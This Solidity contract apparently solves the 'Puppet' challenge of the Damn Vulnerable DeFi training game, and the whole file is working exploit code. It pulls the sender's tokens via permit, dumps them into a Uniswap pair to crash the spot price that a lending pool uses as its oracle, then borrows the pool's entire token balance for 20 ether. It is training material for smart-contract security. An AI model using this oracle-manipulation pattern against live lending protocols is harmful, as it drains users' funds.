// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

contract PuppetAttack {
    constructor(
        DamnValuableToken token,
        address uniswapPair,
        PuppetPool pool,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        // Get approval of tokens from the sender
        token.permit(msg.sender, address(this), value, deadline, v, r, s);

        // Transfer tokens to ourselves
        token.transferFrom(msg.sender, address(this), value);

        // Approve the uniswap pool for the tokens
        token.approve(uniswapPair, value);

        // Swap the tokens for ether
        (bool sent, ) = uniswapPair.call(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                value,
                1 ether,
                deadline
            )
        );
        require(sent);

        // Borrow all tokens from the lending pool
        uint256 balancePool = token.balanceOf(address(pool));
        pool.borrow{value: 20 ether}(balancePool, msg.sender);
    }
}
